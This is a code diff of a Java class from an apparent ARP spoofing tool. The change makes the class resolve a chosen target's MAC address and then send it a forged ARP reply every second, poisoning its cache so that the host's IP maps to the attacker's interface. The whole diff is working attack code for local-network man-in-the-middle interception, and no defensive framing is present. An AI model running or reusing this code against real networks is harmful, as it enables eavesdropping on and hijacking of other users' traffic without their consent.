@@ -1,43 +1,41 @@
 package org.bitducks.spoofing.services;
 
-import java.io.IOException;
 import java.net.InetAddress;
+import java.util.Arrays;
 
 import jpcap.packet.ARPPacket;
 
-import org.apache.log4j.Logger;
 import org.bitducks.spoofing.core.InterfaceInfo;
 import org.bitducks.spoofing.core.Server;
 import org.bitducks.spoofing.core.Service;
 import org.bitducks.spoofing.packet.PacketFactory;
-import org.bitducks.spoofing.util.Constants;
-import org.bitducks.spoofing.util.gateway.GatewayFinder;
-
 
 public class ReplyARPService extends Service {
+	private InetAddress target;
+	private byte[] targetMAC;
+	private InetAddress host;
 	private InterfaceInfo infoInterface;
-	private InetAddress victim;
-	private InetAddress gateway;
 	
-	public ReplyARPService(InetAddress victim) {
+	public ReplyARPService(InetAddress target, InetAddress host) {
 		super();
-		this.victim = victim;
+		this.target = target;
+		this.host = host;
 		infoInterface = Server.getInstance().getInfo();
-		try {
-			gateway = GatewayFinder.find(infoInterface.getDevice());
-		} catch (IOException e) {
-			e.printStackTrace();
-		}
 	}
 	
 	@Override
 	public void run() {
+		MacFindService finderTarget = new MacFindService(target);
+		Server.getInstance().addService(finderTarget);
+		targetMAC = finderTarget.getMacAddress();
+		System.out.println(Arrays.toString(targetMAC));
+		
 		while(! this.isCloseRequested()){
 			replySpoof();
 			
 			//Waiting 500ms to be sure we don't use all the CPU
 			try {
-				Thread.sleep(500);
+				Thread.sleep(1000);
 			} catch (InterruptedException e) {
 				e.printStackTrace();
 			}
@@ -45,8 +43,8 @@ public class ReplyARPService extends Service {
 	}
 	
 	public void replySpoof() {
-		ARPPacket spoofedPacket = PacketFactory.arpReply(infoInterface.getMacAddress(), gateway, victim, Constants.BROADCAST);
-		logger.info("Sending a spoofed ARP reply to " + victim);
+		ARPPacket spoofedPacket = PacketFactory.arpReply(infoInterface.getMacAddress(), host, targetMAC, target);
+		logger.info("Sending a spoofed ARP reply to " + target);
 		Server.getInstance().sendPacket(spoofedPacket);
 	}
 
